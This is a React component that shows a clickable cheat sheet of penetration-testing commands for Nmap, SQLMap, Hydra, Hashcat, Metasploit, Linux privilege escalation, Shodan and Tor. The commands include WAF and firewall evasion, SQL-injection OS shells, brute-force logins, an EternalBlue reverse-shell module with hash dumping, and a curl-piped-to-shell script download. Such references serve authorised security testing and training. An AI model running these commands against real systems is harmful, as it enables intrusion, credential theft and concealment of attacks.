'use client'
import React, { useState } from 'react'

const CHEATSHEETS: Record<string, { desc: string; color: string; commands: { label: string; cmd: string }[] }> = {
  'Nmap': {
    desc: 'Network discovery & security auditing',
    color: '#00ff41',
    commands: [
      { label: 'SYN scan (stealth)', cmd: 'nmap -sS -T4 TARGET' },
      { label: 'Full port scan', cmd: 'nmap -p- -T4 TARGET' },
      { label: 'Service + version', cmd: 'nmap -sV -sC TARGET' },
      { label: 'OS detection', cmd: 'nmap -O TARGET' },
      { label: 'All recon combined', cmd: 'nmap -sV -sC -O -p- -T4 -oA scan TARGET' },
      { label: 'Ping sweep', cmd: 'nmap -sn 192.168.1.0/24' },
      { label: 'SMB vuln check', cmd: 'nmap --script smb-vuln-* -p 445 TARGET' },
      { label: 'HTTP enumeration', cmd: 'nmap --script http-enum -p 80,443 TARGET' },
      { label: 'Firewall evasion', cmd: 'nmap -D RND:10 -f --mtu 24 TARGET' },
      { label: 'UDP scan', cmd: 'nmap -sU --top-ports 100 TARGET' },
    ],
  },
  'Gobuster': {
    desc: 'Directory & DNS bruteforcing',
    color: '#00d4ff',
    commands: [
      { label: 'Directory scan', cmd: 'gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt' },
      { label: 'With extensions', cmd: 'gobuster dir -u http://TARGET -w wordlist.txt -x php,html,txt,bak' },
      { label: 'DNS subdomain', cmd: 'gobuster dns -d example.com -w subdomains.txt' },
      { label: 'With cookies', cmd: 'gobuster dir -u http://TARGET -w wordlist.txt -c "session=abc123"' },
      { label: 'Increase threads', cmd: 'gobuster dir -u http://TARGET -w wordlist.txt -t 50' },
    ],
  },
  'SQLMap': {
    desc: 'Automated SQL injection',
    color: '#ffb347',
    commands: [
      { label: 'Basic scan', cmd: 'sqlmap -u "http://TARGET/page?id=1"' },
      { label: 'POST request', cmd: 'sqlmap -u "http://TARGET" --data="user=a&pass=b"' },
      { label: 'From Burp request', cmd: 'sqlmap -r request.txt' },
      { label: 'List databases', cmd: 'sqlmap -u "URL" --dbs' },
      { label: 'Dump table', cmd: 'sqlmap -u "URL" -D db -T users --dump' },
      { label: 'Bypass WAF', cmd: 'sqlmap -u "URL" --tamper=space2comment --random-agent' },
      { label: 'OS shell', cmd: 'sqlmap -u "URL" --os-shell' },
      { label: 'Via Tor', cmd: 'sqlmap -u "URL" --tor --tor-type=SOCKS5' },
    ],
  },
  'Hydra': {
    desc: 'Online password brute forcing',
    color: '#ff4136',
    commands: [
      { label: 'SSH brute force', cmd: 'hydra -l user -P rockyou.txt ssh://TARGET' },
      { label: 'SSH user list', cmd: 'hydra -L users.txt -P passwords.txt ssh://TARGET -t 4' },
      { label: 'HTTP POST form', cmd: 'hydra -l admin -P rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"' },
      { label: 'FTP brute force', cmd: 'hydra -l admin -P rockyou.txt ftp://TARGET' },
      { label: 'RDP brute force', cmd: 'hydra -l administrator -P rockyou.txt rdp://TARGET' },
    ],
  },
  'Hashcat': {
    desc: 'Offline password cracking',
    color: '#bf5fff',
    commands: [
      { label: 'MD5 dictionary', cmd: 'hashcat -m 0 hashes.txt rockyou.txt' },
      { label: 'NTLM (Windows)', cmd: 'hashcat -m 1000 hashes.txt rockyou.txt' },
      { label: 'NTLMv2 (Responder)', cmd: 'hashcat -m 5600 hashes.txt rockyou.txt' },
      { label: 'bcrypt', cmd: 'hashcat -m 3200 hashes.txt rockyou.txt' },
      { label: 'With rules', cmd: 'hashcat -m 1000 hashes.txt rockyou.txt -r rules/best64.rule' },
      { label: 'Mask attack', cmd: 'hashcat -m 1000 hash.txt -a 3 ?u?l?l?l?d?d?d?d' },
      { label: 'Show cracked', cmd: 'hashcat -m 0 hashes.txt --show' },
    ],
  },
  'Metasploit': {
    desc: 'Exploitation framework',
    color: '#00ff41',
    commands: [
      { label: 'Start msfconsole', cmd: 'msfconsole' },
      { label: 'Search exploit', cmd: 'search type:exploit platform:windows smb' },
      { label: 'Use module', cmd: 'use exploit/windows/smb/ms17_010_eternalblue' },
      { label: 'Set target', cmd: 'set RHOSTS 192.168.1.100' },
      { label: 'Set payload', cmd: 'set PAYLOAD windows/x64/meterpreter/reverse_tcp' },
      { label: 'Run exploit', cmd: 'run' },
      { label: 'Dump hashes', cmd: 'hashdump' },
      { label: 'Local privesc', cmd: 'run post/multi/recon/local_exploit_suggester' },
      { label: 'Pivot route', cmd: 'route add 10.0.0.0/24 SESSION_ID' },
    ],
  },
  'Linux PrivEsc': {
    desc: 'Linux privilege escalation',
    color: '#ffb347',
    commands: [
      { label: 'Current user info', cmd: 'whoami && id && groups' },
      { label: 'Sudo permissions', cmd: 'sudo -l' },
      { label: 'SUID binaries', cmd: 'find / -perm -u=s -type f 2>/dev/null' },
      { label: 'World-writable', cmd: 'find / -writable -type f 2>/dev/null | grep -v proc' },
      { label: 'Cron jobs', cmd: 'cat /etc/cron* /var/spool/cron/* 2>/dev/null' },
      { label: 'Run LinPEAS', cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
      { label: 'Kernel version', cmd: 'uname -r && cat /etc/os-release' },
      { label: 'Network info', cmd: 'netstat -tulpn && ip route' },
    ],
  },
  'Shodan': {
    desc: 'Internet device search engine',
    color: '#00d4ff',
    commands: [
      { label: 'Search by org', cmd: 'org:"Company Name" port:443' },
      { label: 'SSL cert enum', cmd: 'ssl.cert.subject.cn:"*.example.com"' },
      { label: 'Exposed MongoDB', cmd: 'port:27017 product:MongoDB -authentication' },
      { label: 'Exposed Elasticsearch', cmd: 'port:9200 product:Elasticsearch all:search' },
      { label: 'Open directories', cmd: 'http.title:"Index of /"' },
      { label: 'CLI host lookup', cmd: 'shodan host IP_ADDRESS' },
      { label: 'CLI search', cmd: 'shodan search \'org:"Target" port:22\'' },
      { label: 'Count results', cmd: 'shodan count \'port:27017 product:MongoDB\'' },
    ],
  },
  'Amass / Subfinder': {
    desc: 'Subdomain enumeration',
    color: '#00ff41',
    commands: [
      { label: 'Amass passive', cmd: 'amass enum -d example.com -passive' },
      { label: 'Amass active', cmd: 'amass enum -d example.com -active' },
      { label: 'Subfinder fast', cmd: 'subfinder -d example.com -silent' },
      { label: 'Cert transparency', cmd: 'curl "https://crt.sh/?q=%25.example.com&output=json" | python3 -c "import json,sys;[print(r[\'name_value\']) for r in json.load(sys.stdin)]" | sort -u' },
      { label: 'DNS brute force', cmd: 'dnsrecon -d example.com -t brt -D wordlist.txt' },
    ],
  },
  'Torsocks': {
    desc: 'Route traffic through Tor',
    color: '#00ff41',
    commands: [
      { label: 'Start Tor service', cmd: 'sudo systemctl start tor' },
      { label: 'Verify Tor IP', cmd: 'torsocks curl https://check.torproject.org/api/ip' },
      { label: 'Wrap any command', cmd: 'torsocks COMMAND_HERE' },
      { label: 'Tor shell', cmd: 'torsocks bash' },
      { label: 'Force new circuit', cmd: 'echo -e \'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\nQUIT\' | nc 127.0.0.1 9051' },
      { label: 'Start Nyx monitor', cmd: 'sudo nyx' },
      { label: 'Create hidden service', cmd: 'echo "HiddenServiceDir /var/lib/tor/hs/\nHiddenServicePort 80 127.0.0.1:8080" | sudo tee -a /etc/tor/torrc' },
    ],
  },
}

export default function CheatSheet() {
  const [open, setOpen] = useState(false)
  const [selected, setSelected] = useState('Nmap')
  const [search, setSearch] = useState('')
  const [copied, setCopied] = useState('')

  const copy = (cmd: string) => {
    navigator.clipboard.writeText(cmd).catch(() => {})
    setCopied(cmd)
    setTimeout(() => setCopied(''), 1500)
  }

  const sheet = CHEATSHEETS[selected]
  const filtered = sheet.commands.filter(c =>
    search === '' || c.label.toLowerCase().includes(search.toLowerCase()) || c.cmd.toLowerCase().includes(search.toLowerCase())
  )

  return (
    <>
      <button onClick={() => setOpen(!open)} style={{ position: 'fixed', bottom: '24px', left: '24px', zIndex: 1000, background: 'rgba(0,212,255,0.08)', border: '1px solid rgba(0,212,255,0.3)', borderRadius: '6px', padding: '6px 12px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#00d4ff', letterSpacing: '0.1em', display: 'flex', alignItems: 'center', gap: '6px' }}>
        <span style={{ fontSize: '12px' }}>{'{}'}</span> CHEAT SHEETS
      </button>

      {open && (
        <div style={{ position: 'fixed', bottom: '65px', left: '24px', zIndex: 999, width: '480px', height: '540px', background: '#080c0a', border: '1px solid rgba(0,212,255,0.2)', borderRadius: '10px', display: 'flex', flexDirection: 'column', fontFamily: 'JetBrains Mono, monospace', overflow: 'hidden' }}>
          <div style={{ padding: '10px 14px', borderBottom: '1px solid #1a2e1e', background: 'rgba(0,212,255,0.04)', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <span style={{ fontSize: '11px', color: '#00d4ff', fontWeight: 700, letterSpacing: '0.15em' }}>COMMAND CHEAT SHEETS</span>
            <button onClick={() => setOpen(false)} style={{ background: 'none', border: 'none', color: '#2a5a2a', cursor: 'pointer', fontSize: '16px' }}>×</button>
          </div>

          <div style={{ display: 'flex', gap: '4px', padding: '8px 10px', borderBottom: '1px solid #1a2e1e', flexWrap: 'wrap' as const }}>
            {Object.keys(CHEATSHEETS).map(tool => (
              <button key={tool} onClick={() => { setSelected(tool); setSearch('') }} style={{ background: selected === tool ? `${CHEATSHEETS[tool].color}15` : 'transparent', border: `1px solid ${selected === tool ? CHEATSHEETS[tool].color + '44' : '#1a2e1e'}`, borderRadius: '3px', padding: '3px 8px', cursor: 'pointer', fontSize: '7px', color: selected === tool ? CHEATSHEETS[tool].color : '#3a6a3a', letterSpacing: '0.08em' }}>{tool}</button>
            ))}
          </div>

          <div style={{ padding: '6px 10px', borderBottom: '1px solid #0e1a10' }}>
            <input
              value={search}
              onChange={e => setSearch(e.target.value)}
              placeholder="Search commands..."
              style={{ width: '100%', background: 'transparent', border: '1px solid #1a2e1e', borderRadius: '3px', padding: '4px 8px', color: '#8a9a8a', fontSize: '0.7rem', fontFamily: 'JetBrains Mono, monospace', outline: 'none' }}
            />
          </div>

          <div style={{ padding: '4px 8px 2px', borderBottom: '1px solid #0e1a10' }}>
            <span style={{ fontSize: '8px', color: '#3a6a3a' }}>{sheet.desc}</span>
          </div>

          <div style={{ flex: 1, overflowY: 'auto', padding: '6px 8px' }}>
            {filtered.map((c, i) => (
              <div key={i} onClick={() => copy(c.cmd)} style={{ padding: '7px 10px', borderRadius: '4px', cursor: 'pointer', marginBottom: '3px', background: copied === c.cmd ? 'rgba(0,255,65,0.06)' : 'rgba(0,212,255,0.02)', border: `1px solid ${copied === c.cmd ? 'rgba(0,255,65,0.2)' : '#1a2e1e'}`, transition: 'all 0.1s' }}>
                <div style={{ fontSize: '8px', color: copied === c.cmd ? '#00ff41' : '#3a8a9a', marginBottom: '3px', letterSpacing: '0.05em' }}>{copied === c.cmd ? '✓ COPIED' : c.label}</div>
                <div style={{ fontSize: '0.7rem', color: sheet.color, fontFamily: 'JetBrains Mono, monospace', wordBreak: 'break-all' as const }}>{c.cmd}</div>
              </div>
            ))}
            {filtered.length === 0 && <div style={{ fontSize: '0.7rem', color: '#2a4a2a', padding: '12px', textAlign: 'center' }}>No commands matching "{search}"</div>}
          </div>

          <div style={{ padding: '6px 10px', borderTop: '1px solid #0e1a10', fontSize: '8px', color: '#2a4a2a', letterSpacing: '0.08em' }}>
            CLICK ANY COMMAND TO COPY · {filtered.length} COMMANDS
          </div>
        </div>
      )}
    </>
  )
}
